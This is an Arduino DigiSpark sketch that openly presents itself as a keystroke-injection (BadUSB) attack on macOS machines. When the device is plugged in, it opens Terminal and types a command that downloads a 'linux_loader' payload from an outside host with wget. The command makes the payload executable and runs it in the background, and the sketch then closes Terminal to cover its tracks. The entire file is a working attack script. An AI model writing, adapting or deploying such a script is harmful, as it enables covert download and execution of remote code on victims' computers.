#include "DigiKeyboard.h"

/***
 *
 * This is an attack for Mac (OSX) machines. It opens up a terminal window, and executes the bash command. It then downloads the loader, sets it to executable,
 * executes it, and closes the terminal window.
 *
 ***/

#define MOD_CMD_LEFT 0x00000008

void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("terminal");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("bash");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("nohup wget https://sheep.casa/payloads/linux_loader -P /tmp && nohup chmod +x /tmp/linux_loader && nohup /tmp/linux_loader & exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("disown $!");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
}

void loop() {

}
